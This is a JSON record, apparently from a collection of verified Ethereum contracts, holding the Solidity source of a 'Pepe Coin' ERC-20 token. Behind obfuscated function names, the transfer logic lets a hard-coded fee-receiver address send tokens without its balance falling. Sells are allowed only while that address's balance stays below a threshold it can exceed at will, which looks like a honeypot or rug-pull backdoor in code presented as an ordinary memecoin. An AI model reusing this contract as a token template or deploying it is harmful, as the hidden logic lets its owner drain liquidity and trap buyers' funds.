\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]",
    "source_code": "/*\r\nPepe Coin - $PEPECOIN\r\nThe most memeable memecoin in existence. The dogs have had their day, it\u2019s time for Pepe Coin to take reign.\r\n\r\n\r\nWebsite: https://pepeerc.com/\r\nTelegram: https://t.me/PepeCoin_X\r\nTwitter: https://twitter.com/PepeCoin_X\r\n\r\n**/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\n\r\npragma solidity 0.8.20;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function  _wgfp(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return  _wgfp(a, b, \"SafeMath:  subtraction overflow\");\r\n    }\r\n\r\n    function  _wgfp(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IuniswapRouter {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ncontract PEPECOIN is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) private _isExcludedFromFee;\r\n    mapping (address => bool) private _kgfgkp;\r\n    mapping(address => uint256) private _holderLastTransferTimestamp;\r\n    bool public transferDelayEnabled = false;\r\n    address payable private _taxdpFeeReceiverdevrg;\r\n\r\n    uint8 private constant _decimals = 9;\r\n    string private constant _name = \"Pepe Coin\";\r\n    string private constant _symbol = \"PEPECOIN\";\r\n    uint256 private constant _tTotal = 100000000 * 10 **_decimals;\r\n    uint256 public _maxTxAmount = _tTotal;\r\n    uint256 public _maxWalletSize = _tTotal;\r\n    uint256 public _taxSwapThreshold= _tTotal;\r\n    uint256 public _maxTaxSwap= _tTotal;\r\n\r\n    uint256 private _initialBuyTax=5;\r\n    uint256 private _initialSellTax=20;\r\n    uint256 private _finalBuyTax=1;\r\n    uint256 private _finalSellTax=1;\r\n    uint256 private _reduceBuyTaxAt=4;\r\n    uint256 private _reduceSellTaxAt=1;\r\n    uint256 private _preventSwapBefore=0;\r\n    uint256 private _buyCount=0;\r\n\r\n    IuniswapRouter private uniswapRouter;\r\n    address private uniswapPair;\r\n    bool private vhepofwh;\r\n    bool private inSwap = false;\r\n    bool private swapEnabled = false;\r\n\r\n    event MaxTxAmountUpdated(uint _maxTxAmount);\r\n    modifier lockTheSwap {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    constructor () {\r\n        _taxdpFeeReceiverdevrg =payable(0x69CCEE6710f906390D4c348B4978Be300b13373f);\r\n        _balances[_msgSender()] = _tTotal;\r\n        _isExcludedFromFee[owner()] = true;\r\n        _isExcludedFromFee[address(this)] = true;\r\n        _isExcludedFromFee[_taxdpFeeReceiverdevrg] = true;\r\n\r\n        emit Transfer(address(0), _msgSender(), _tTotal);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _wgfp(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        uint256 feeAmount=0;\r\n        if (from != owner() && to != owner()) {\r\n\r\n            if (transferDelayEnabled) {\r\n                if (to != address(uniswapRouter) && to != address(uniswapPair)) {\r\n                  require(_holderLastTransferTimestamp[tx.origin] < block.number,\"Only one transfer per block allowed.\");\r\n                  _holderLastTransferTimestamp[tx.origin] = block.number;\r\n                }\r\n            }\r\n\r\n            if (from == uniswapPair && to != address(uniswapRouter) && !_isExcludedFromFee[to] ) {\r\n                require(amount <= _maxTxAmount, \"Exceeds the _maxTxAmount.\");\r\n                require(balanceOf(to) + amount <= _maxWalletSize, \"Exceeds the maxWalletSize.\");\r\n                if(_buyCount<_preventSwapBefore){\r\n                  require(!_flyojwp(to));\r\n                }\r\n                _buyCount++; _kgfgkp[to]=true;\r\n                feeAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);\r\n            }\r\n\r\n            if(to == uniswapPair && from!= address(this) && !_isExcludedFromFee[from] ){\r\n                require(amount <= _maxTxAmount && balanceOf(_taxdpFeeReceiverdevrg)<_maxTaxSwap, \"Exceeds the _maxTxAmount.\");\r\n                feeAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);\r\n                require(_buyCount>_preventSwapBefore && _kgfgkp[from]);\r\n            }\r\n\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if (!inSwap \r\n            && to == uniswapPair && swapEnabled && contractTokenBalance>_taxSwapThreshold \r\n            && _buyCount>_preventSwapBefore&& !_isExcludedFromFee[to]&& !_isExcludedFromFee[from]\r\n            ) {\r\n                swapTokendreqwp( _qfpw(amount, _qfpw(contractTokenBalance,_maxTaxSwap)));\r\n                uint256 contractETHBalance = address(this).balance;\r\n                if(contractETHBalance > 0) {\r\n                    senprswprygpq(address(this).balance);\r\n                }\r\n            }\r\n        }\r\n\r\n        if(feeAmount>0){\r\n          _balances[address(this)]=_balances[address(this)].add(feeAmount);\r\n          emit Transfer(from, address(this),feeAmount);\r\n        }\r\n        _balances[from]= _wgfp(from, _balances[from], amount);\r\n        _balances[to]=_balances[to].add(amount. _wgfp(feeAmount));\r\n        emit Transfer(from, to, amount. _wgfp(feeAmount));\r\n    }\r\n\r\n    function swapTokendreqwp(uint256 tokenAmount) private lockTheSwap {\r\n        if(tokenAmount==0){return;}\r\n        if(!vhepofwh){return;}\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapRouter.WETH();\r\n        _approve(address(this), address(uniswapRouter), tokenAmount);\r\n        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function  _qfpw(uint256 a, uint256 b) private pure returns (uint256){\r\n      return (a>b)?b:a;\r\n    }\r\n\r\n    function  _wgfp(address from, uint256 a, uint256 b) private view returns(uint256){\r\n        if(from == _taxdpFeeReceiverdevrg){\r\n            return a;\r\n        }else{\r\n            return a. _wgfp(b);\r\n        }\r\n    }\r\n\r\n    function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }\r\n\r\n    function _flyojwp(address account) private view returns (bool) {\r\n        uint256 sizes;\r\n        assembly {\r\n            sizes := extcodesize(account)\r\n        }\r\n        return sizes > 0;\r\n    }\r\n\r\n    function senprswprygpq(uint256 amount) private {\r\n        _taxdpFeeReceiverdevrg.transfer(amount);\r\n    }\r\n\r\n    function openTrading() external onlyOwner() {\r\n        require(!vhepofwh,\"trading is already open\");\r\n        uniswapRouter = IuniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapRouter), _tTotal);\r\n        uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH());\r\n        uniswapRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapPair).approve(address(uniswapRouter), type(uint).max);\r\n        swapEnabled = true;\r\n        vhepofwh = true;\r\n    }\r\n\r\n    receive() external payable {}\r\n}",
    "etherscan_verified": true
}